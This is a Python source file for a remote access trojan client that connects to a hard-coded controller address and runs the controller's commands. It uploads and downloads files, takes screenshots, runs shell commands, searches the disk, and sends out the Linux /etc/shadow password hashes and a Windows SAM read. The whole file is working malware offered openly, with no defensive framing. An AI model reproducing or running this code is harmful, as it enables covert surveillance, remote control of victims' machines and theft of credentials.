import socket
import os
import platform
import subprocess
import sys
import glob
import pyautogui
from PIL import Image
import random

GENERIC_READ = -2147483648
FILE_SHARE_WRITE = 2
FILE_SHARE_READ = 1
FILE_SHARE_DELETE = 4
CREATE_ALWAYS = 2

class RAT_CLIENT:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port


    def build_connection(self):
        global client
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((self.ip, self.port))
        sending = socket.gethostbyname(socket.gethostname())
        client.send(sending.encode())
        

    
    def execution(self) :
       while True :
        command = client.recv(1024).decode()
        
        if command == 'upload':
            filename = client.recv(6000)
            newfile = open(filename, 'wb')
            data = client.recv(6000)
            newfile.write(data)
            newfile.close()
        elif command[:8] == 'download':
                    
            file = open (command.split(" ")[1], 'rb') 
            data = file.read()
            client.sendall(data)
        elif command == 'screenshot':
            try:
                file = f'{random.randint(111111, 444444)}.jpeg'
                file2 = f'{random.randint(555555, 999999)}.jpeg'
                pyautogui.screenshot(file)
                image = Image.open(file)
                new_image = image.resize((1280, 800))
                new_image.save(file2)
                with open(file2, 'rb') as img_file:
                    data = img_file.read()
                    client.sendall(data)

            except Exception as e:

                print("Error capturing screenshot:", str(e))

        elif command.startswith("ipconfig") :
            result = subprocess.run(command, shell=True, capture_output= True, text=True)
            print(result.stdout)
            client.sendall((result.stdout).encode('utf-8'))
           #pour un client linux 
        elif command.startswith("ifconfig") :
            result = subprocess.run(command, shell=True, capture_output= True, text=True)
            print(result.stdout)
            client.sendall((result.stdout).encode('utf-8'))
            
        elif command == 'exit':
            sys.exit()  
        
        elif command.startswith("find") :
            result = subprocess.run(command, shell=True, capture_output= True, text=True)
            print(result.stdout)
            client.sendall(result.stdout.encode('utf-8'))
           
        elif command[:6] == "search":  
            repertoire_recherche, extension = command.split(" ")
            for x in glob.glob(os.path.join(repertoire_recherche, '**', '*'), recursive=True):
                if x.endswith(extension):
                    chemin_absolu = os.path.abspath(x)
                    client.sendall(str(chemin_absolu).encode())  
        elif command == 'pwd':
            curdir = str(os.getcwd())
            print(curdir)
            client.sendall(curdir.encode('utf-8'))
        elif command == 'ls':
            result = subprocess.run(command, shell=True, capture_output= True, text=True)
            print(result.stdout)
            client.sendall((result.stdout).encode('utf-8'))
        elif command[:2] == 'cd':
            new_directory = command[2:].strip()
          
            os.chdir(new_directory)
            #current_directory = os.getcwd()
            #print(new_directory)
            client.sendall(new_directory.encode())
            #output = subprocess.getoutput(command)
            #client.sendall(output.encode())
        elif command == 'cd ..':
            os.chdir('..')
            curdir = str(os.getcwd())
            client.sendall(curdir.encode('utf-8'))
        elif command == 'dir':    
            output = subprocess.check_output(["dir"], shell=True)
            output = output.decode('utf8', errors='ignore')
            client.sendall(output.encode())
        elif command == 'hashdump':
            with open('/etc/shadow', 'rb') as file:
                data = file.read()
                client.sendall(b'hashdump')
                client.sendall(data)
               #pour un client windows 
        elif command =='samdump':
            with open('HKEY_LOCAL_MACHINE\SAM sam', 'rb') as file:
                data = file.read()
                client.sendall(b'samdump')
                client.sendall(data)

    
rat = RAT_CLIENT('192.168.1.20', 12345)

if __name__ == '__main__':
    rat.build_connection()
    while True:
        try:
            rat.execution()
        except Exception as e:
            print("An error occurred:", str(e))
    
